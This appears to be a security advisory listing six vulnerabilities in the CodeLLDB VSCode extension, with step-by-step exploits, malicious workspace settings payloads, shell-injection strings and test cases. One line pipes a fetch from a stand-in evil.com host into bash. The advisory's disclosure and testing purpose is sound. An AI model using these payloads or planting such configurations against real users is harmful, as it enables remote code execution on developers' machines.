# Critical Security Vulnerabilities in CodeLLDB

## 1. Command Injection via RPC Server / Unauthenticated External Debug Session Invocation

### Description
The CodeLLDB extension offers an RPC server feature that listens for debug configurations on a Unix or TCP socket. The implementation has insufficient validation of the commands that can be included in these debug configurations. When a victim opens a malicious repository in VSCode with a workspace configuration that enables the RPC server, an attacker can send carefully crafted JSON payloads to the RPC server to execute arbitrary commands on the victim's machine.

Step by step exploit:
1. Create a malicious repository with a `.vscode/settings.json` file that contains:
   ```json
   {
     "lldb.rpcServer": { 
       "host": "0.0.0.0", 
       "port": 12345
     }
   }
   ```
2. When the victim opens this repository in VSCode, the extension will start an RPC server listening on all interfaces
3. The attacker connects (e.g. via netcat) to the listening port and sends YAML/JSON data with a payload:
   ```json
   {
     "processCreateCommands": ["platform shell command_to_execute"]
   }
   ```
4. Without proper authentication or validation, the RPC server passes the configuration to `debug.startDebugging`, thereby launching the malicious process.

### Impact
This vulnerability allows remote code execution on the victim's machine. An attacker can execute arbitrary commands with the permissions of the VSCode process, potentially leading to complete system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
If a token is configured in the settings, the server checks that the submitted configuration includes a matching token. However, this is:
1. Not mandatory
2. Not enabled by default
3. Easily omitted in a malicious configuration

### Missing Mitigations
- The RPC server should not bind to external interfaces by default
- Strict validation of commands sent through this interface
- Mandate that a strong authentication token be configured and enforced
- Implement robust input validation for payloads and restrict allowed configuration fields
- Protection against CSRF attacks when connecting to local sockets
- Warning to the user when an RPC server is started

### Preconditions
1. Victim must open a malicious repository in VSCode
2. The CodeLLDB extension must be installed
3. The workspace (or global settings) enables `"lldb.rpcServer"` without a strong (or any) token
4. The victim's firewall must allow connections to the configured port (if attacked remotely)

### Source Code Analysis
In the `externalLaunch.ts` file, the `RpcLaunchServer` class processes incoming requests by parsing them using YAML.parse and then passes them directly to VSCode's debug.startDebugging API:

```typescript
async processRequest(request: string) {
    let debugConfig: DebugConfiguration = {
        type: 'lldb',
        request: 'launch',
        name: '',
    };
    Object.assign(debugConfig, YAML.parse(request));
    debugConfig.name = debugConfig.name || debugConfig.program;
    if (this.token) {
        if (debugConfig.token != this.token)
            return '';
        delete debugConfig.token;
    }
    try {
        let success = await debug.startDebugging(undefined, debugConfig);
        return JSON.stringify({ success: success });
    } catch (err) {
        return JSON.stringify({ success: false, message: err.toString() });
    }
}
```

In `main.ts`, the RPC server is configured based on user settings:

```typescript
updateRpcServer() {
    if (this.rpcServer) {
        output.appendLine('Stopping RPC server');
        this.rpcServer.close();
        this.rpcServer = null;
    }
    let config = getExtensionConfig();
    let options = config.get('rpcServer') as any;
    if (options) {
        output.appendLine(`Starting RPC server with: ${inspect(options)}`);
        this.rpcServer = new RpcLaunchServer({ token: options.token });
        this.rpcServer.listen(options)
    }
}
```

This allows a malicious repository to configure the RPC server to listen on all interfaces (0.0.0.0) without requiring authentication.

### Security Test Case
1. Set up a victim machine with VSCode and CodeLLDB extension
2. Create a malicious repository with this `.vscode/settings.json`:
   ```json
   {
     "lldb.rpcServer": {
       "host": "127.0.0.1", 
       "port": 12345
     }
   }
   ```
3. Have the victim open this repository in VSCode
4. From an attacker machine, run:
   ```bash
   echo '{"targetCreateCommands":["target create /bin/ls"], "processCreateCommands":["platform shell touch /tmp/pwned"]}' | nc 127.0.0.1 12345
   ```
5. Verify that the file `/tmp/pwned` has been created on the victim's machine, confirming successful command execution
6. Optionally, confirm that providing a token in the settings causes payloads lacking the token to be rejected.

## 2. Command Injection via URL Handlers / Malicious Deep Link Debug Session Launch

### Description
CodeLLDB implements URL handlers that allow launching debug sessions from outside VSCode. The extension registers a URI handler (in *extension/externalLaunch.ts* within the `UriLaunchServer` class) to process deep links such as `vscode://vadimcn.vscode-lldb/launch/command?...`. When the user clicks such a link, the handler decodes the query string, uses basic parsing to build a debug configuration, and immediately calls `debug.startDebugging` with that configuration without further validation. An attacker can craft a malicious URI that, when clicked by a victim, will execute arbitrary commands through the debugging infrastructure.

Step by step exploit:
1. Create a malicious URI like: `vscode://vadimcn.vscode-lldb/launch/command?/bin/sh -c 'malicious command'`
2. Distribute this URI to a victim (e.g., in a markdown file, email, or webpage)
3. When the victim clicks the URI, VSCode will open and CodeLLDB will execute the specified command

### Impact
This vulnerability allows command execution on the victim's machine. An attacker can execute arbitrary commands with the permissions of the VSCode process when a victim clicks a malicious URI.

### Vulnerability Rank
High

### Currently Implemented Mitigations
Only the RPC launch server (a different code path) optionally uses a token check; the deep link handler does not perform input validation or request user confirmation.

### Missing Mitigations
- Validate and sanitize deep link query parameters rigorously before composing a debug configuration
- Require explicit user confirmation or enforce a safe list of allowed executables
- Confirmation dialog before launching debug sessions from external URIs
- Optionally mandate cryptographic signing or a token check for deep link-initiated requests
- Restricting what commands can be executed via the URL handler

### Preconditions
1. Victim must have VSCode with CodeLLDB extension installed
2. Victim must click the malicious URI

### Source Code Analysis
In `externalLaunch.ts`, the `UriLaunchServer` class handles URIs:

```typescript
async handleUri(uri: Uri) {
    try {
        output.appendLine(`Handling uri: ${uri}`);
        let query = decodeURIComponent(uri.query);
        output.appendLine(`Decoded query:\n${query}`);

        if (uri.path == '/launch/command') {
            let frags = query.split('&');
            let cmdLine = frags.pop();

            let env: Dict<string> = {}
            for (let frag of frags) {
                let pos = frag.indexOf('=');
                if (pos > 0)
                    env[frag.substr(0, pos)] = frag.substr(pos + 1);
            }

            let args = stringArgv(cmdLine);
            let program = args.shift();
            let debugConfig: DebugConfiguration = {
                type: 'lldb',
                request: 'launch',
                name: '',
                program: program,
                args: args,
                env: env,
            };
            debugConfig.name = debugConfig.name || debugConfig.program;
            await debug.startDebugging(undefined, debugConfig);
        }
        // [other handlers omitted for brevity]
    } catch (err) {
        await window.showErrorMessage(err.message);
    }
}
```

The cmdLine from the URI is split using stringArgv and used to create a debug configuration without any validation. If a malicious command like `/bin/sh -c 'curl http://evil.com/script | bash'` is passed, it will be executed through the debugging infrastructure.

### Security Test Case
1. Craft a deep link such as:  
   ```
   vscode://vadimcn.vscode-lldb/launch/command?MALICIOUS_ENV=1&/bin/sh -c 'touch /tmp/url_handler_pwned'
   ```  
   *(On a test system, substitute with a benign executable that logs its execution.)*  
2. Open the manipulated repository or paste the URL into a browser/command line.
3. Verify that the file `/tmp/url_handler_pwned` has been created on the victim's machine, confirming successful code execution

## 3. Code Execution via Python Expression Evaluation

### Description
CodeLLDB allows Python expressions to be evaluated within the debugging context. These expressions have full access to Python's functionality including the ability to import modules and execute arbitrary code. A malicious repository can include launch configurations with crafted Python expressions that execute arbitrary code when a victim starts debugging.

Step by step exploit:
1. Create a malicious repository with a `.vscode/launch.json` file containing:
   ```json
   {
     "configurations": [{
       "type": "lldb",
       "request": "launch",
       "name": "Debug",
       "program": "${workspaceFolder}/some_program",
       "preRunCommands": [
         "script import os; os.system('malicious command')"
       ]
     }]
   }
   ```
2. When the victim opens this repository and starts debugging, the Python code in `preRunCommands` will be executed

### Impact
This vulnerability allows execution of arbitrary code when a victim starts debugging a malicious repository. The code will run with the same privileges as the VSCode process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None identified. The Python expression evaluator appears to run with full privileges and access to all Python modules.

### Missing Mitigations
- Sandboxing Python evaluation
- Restricting module imports in evaluated expressions
- Warning the user before executing Python code from untrusted sources
- Disabling dangerous functions in the Python environment

### Preconditions
1. Victim must open a malicious repository in VSCode
2. The CodeLLDB extension must be installed
3. Victim must start debugging the project

### Source Code Analysis
Python expressions can be included in debug configurations as seen in `main.ts` where debug configurations are processed:

```typescript
async resolveDebugConfiguration(
    folder: WorkspaceFolder | undefined,
    launchConfig: DebugConfiguration,
    cancellation?: CancellationToken
): Promise<DebugConfiguration> {
    // [...]
    let launchDefaults = getExtensionConfig(folder, 'launch');
    this.mergeWorkspaceSettings(launchConfig, launchDefaults);
    // [...]
    return launchConfig;
}

mergeWorkspaceSettings(debugConfig: DebugConfiguration, launchConfig: WorkspaceConfiguration) {
    // [...]
    mergeConfig('initCommands');
    mergeConfig('preRunCommands');
    mergeConfig('postRunCommands');
    // [...]
}
```

These commands are passed to the debug adapter which evaluates them within the LLDB interpreter, which can run arbitrary Python code through the `script` command. The extension doesn't perform any validation on these commands, allowing execution of arbitrary Python code.

### Security Test Case
1. Set up a victim machine with VSCode and CodeLLDB extension
2. Create a malicious repository with this `.vscode/launch.json`:
   ```json
   {
     "configurations": [{
       "type": "lldb",
       "request": "launch",
       "name": "Debug",
       "program": "${workspaceFolder}/some_program",
       "preRunCommands": [
         "script import os; os.system('touch /tmp/python_eval_pwned')"
       ]
     }]
   }
   ```
3. Have the victim open this repository in VSCode and start debugging
4. Verify that the file `/tmp/python_eval_pwned` has been created on the victim's machine, confirming successful code execution

## 4. Command Injection via Process Picker Init Commands

### Description
The "Pick Process" command (in *extension/pickProcess.ts*) gathers a list of processes by constructing a shell command that invokes LLDB's process–listing capability. It iterates over an array of initialization commands (passed via the `initCommands` option) and appends each to a string with:  
```
initArgs += ` --one-line "${command}"`
```  
Because these commands are not sanitized or escaped, an attacker supplying a manipulated workspace configuration (for example, in a malicious .vscode/settings.json file) can include shell metacharacters. For example, an entry like  
```
'"; touch /tmp/injected; echo "'
```  
will cause the shell to interpret and execute the injected command when the "Pick Process" command is run.

*Step by step triggering:*  
1. The attacker supplies a malicious .vscode/settings.json defining an `initCommands` array entry such as:  
   ```
   '"; touch /tmp/injected; echo "'
   ```  
2. When the victim invokes the "Pick Process" command, the unsanitized command string is embedded into a shell command.  
3. The shell interprets the metacharacters and executes the injection payload.

### Impact
This flaw enables an attacker to execute arbitrary shell commands on the victim's system (with the same privileges as VSCode), which can be leveraged for full system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
No escaping or sanitization is applied to strings in the `initCommands` array.

### Missing Mitigations
• Validate and whitelist or properly escape all commands sourced from workspace configuration.  
• Alternatively, avoid constructing shell commands via string concatenation (e.g. use APIs like `execFile` with an argument array).

### Preconditions
• The victim opens a workspace containing a malicious .vscode/settings.json with crafted `initCommands`.  
• The victim later runs the "Pick Process" (or "Pick My Process") command.

### Source Code Analysis
1. In *extension/pickProcess.ts*, the helper function `getProcessList` checks for an `initCommands` property and iterates over the array.  
2. Each command is embedded via a template literal into a larger command string without any sanitization.  
3. The final command, which now contains attacker–supplied shell metacharacters, is executed with `cp.exec`, allowing payload execution.

### Security Test Case
1. In a test workspace, create a .vscode/settings.json that includes:  
   ```json
   {
     "initCommands": [ "\"; touch /tmp/injected; echo \"" ]
   }
   ```  
2. Execute the "Pick Process" command from the CodeLLDB command palette.  
3. Verify (e.g. by checking for the presence of the `/tmp/injected` file) that the injected command was executed.

## 5. Prototype Pollution via dbgconfig Expansion in Debug Configuration

### Description
When a debug session is launched, the extension uses a helper function in *extension/configUtils.ts* (`expandDbgConfig`) to merge variables from a dbgconfig object (sourced from workspace settings) into the debug configuration. This function uses `Object.assign()` without filtering dangerous keys. An attacker providing a malicious dbgconfig (for example, via a manipulated .vscode/settings.json file) can include a key like `__proto__` with an object payload. When merged, this key modifies the prototype of plain objects used elsewhere in the extension, potentially causing subsequent code lookups to retrieve attacker–controlled values.

*Step by step triggering:*  
1. The attacker supplies a workspace settings file containing:  
   ```json
   {
     "lldb": {
       "dbgconfig": {
         "__proto__": { "polluted": "yes" }
       }
     }
   }
   ```  
2. When the extension calls `expandDbgConfig`, it copies the dbgconfig via `Object.assign({})`, which includes the dangerous `__proto__` key.  
3. The global prototype is polluted, so that expressions like `({}).polluted` thereafter yield `"yes"`.

### Impact
Prototype pollution can fundamentally alter the behavior of objects across the extension (or third–party libraries it relies on), potentially enabling further code–injection, privilege escalation, or unexpected control flow.

### Vulnerability Rank
High

### Currently Implemented Mitigations
No filtering or sanitizing of keys (such as `__proto__`, `constructor`, or `prototype`) is performed before merging dbgconfig data.

### Missing Mitigations
• Sanitize or whitelist keys in user–supplied configuration objects to prevent dangerous keys from being merged.  
• Use safe merge utilities that do not allow prototype modifications.

### Preconditions
• The manipulated repository includes a .vscode/settings.json defining an lldb/dbgconfig property with keys such as `__proto__`.  
• The victim opens this workspace so that the dbgconfig is read and expanded.

### Source Code Analysis
1. In *extension/configUtils.ts*, the function `expandDbgConfig` begins by copying the dbgconfig object with:  
   ```js
   let dbgconfig = Object.assign({}, dbgconfigConfig);
   ```  
2. The function iterates over all keys of the dbgconfig without checking for reserved keys.  
3. As a result, if the dbgconfig contains a key named `__proto__`, it becomes part of the global prototype of objects.

### Security Test Case
1. In a controlled workspace, create a .vscode/settings.json file containing:  
   ```json
   {
     "lldb": {
       "dbgconfig": {
         "__proto__": { "polluted": "yes" }
       }
     }
   }
   ```  
2. Open the workspace in VSCode so the extension loads the configuration.  
3. In the debug console or via a simple script, evaluate:  
   ```js
   ({}).polluted
   ```  
   If it outputs `"yes"`, then prototype pollution has occurred, demonstrating the vulnerability.

## 6. Manipulated Cargo Executable Launch (RCE)

### Description
In *extension/cargo.ts*, the function `runCargo` retrieves a "cargo" command from the workspace configuration using the helper `getExtensionConfig`. The code obtains the command with:
```js
let cargoCmd = config.get<string>('cargo', 'cargo');
```
and then spawns it via:
```js
cp.spawn(cargoCmd, args, { stdio: ['ignore', 'pipe', 'pipe'], cwd, env: mergedEnvironment(env) });
```
Because this configuration value comes directly from the workspace's settings (such as in a .vscode/settings.json file) and is used without further validation, an attacker supplying a manipulated repository can override the "cargo" setting to point to an arbitrary executable.  
*Step by step triggering:*  
1. The attacker provides a manipulated repository with a .vscode/settings.json file that sets:  
   ```json
   { "cargo": "/path/to/malicious_executable" }
   ```  
2. When the victim opens the repository, the extension reads this setting and assigns the malicious value to `cargoCmd`.  
3. Later, when a cargo task is executed (for example, to build artifacts), the extension calls `cp.spawn` using the attacker–supplied executable, causing it to run.

### Impact
An attacker–controlled "cargo" setting results in the extension executing an arbitrary binary. This constitutes remote code execution (RCE), as the malicious executable runs with the privileges of the user.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
There is no validation or sanitization on the "cargo" setting retrieved from the workspace configuration; it is used as the executable command directly.

### Missing Mitigations
• Enforce strict validation of configuration values to ensure the "cargo" command is either not overridden or belongs to a set of known safe commands.  
• Optionally require explicit user confirmation if the workspace attempts to define an alternative cargo executable.

### Preconditions
• The victim opens a workspace (or repository) that contains a manipulated .vscode/settings.json with a malicious "cargo" property.  
• The user triggers a cargo task (for example, by starting a debug session that uses cargo), thereby invoking `runCargo`.

### Source Code Analysis
1. In *extension/cargo.ts*, the code calls:  
   ```js
   let config = getExtensionConfig(this.folder);
   let cargoCmd = config.get<string>('cargo', 'cargo');
   ```
   which reads the "cargo" setting from the workspace configuration, defaulting to `"cargo"`.  
2. Immediately afterward, the code calls:  
   ```js
   cp.spawn(cargoCmd, args, { /* environment and cwd settings */ });
   ```
   with no checks on the value of `cargoCmd`.  
3. Thus, if an attacker sets `"cargo": "/path/to/malicious_executable"`, the malicious executable is spawned.

### Security Test Case
1. In a test repository, create a .vscode/settings.json file containing:  
   ```json
   { "cargo": "/path/to/benign_test_executable" }
   ```  
   where `/path/to/benign_test_executable` is a harmless script that logs its execution (or creates a marker file).  
2. Open the repository in VSCode with the extension installed.  
3. Trigger a cargo task (for example, by initiating a cargo build via CodeLLDB).  
4. Verify that the benign test executable is launched instead of the expected cargo tool, confirming that the "cargo" setting controls which executable is run.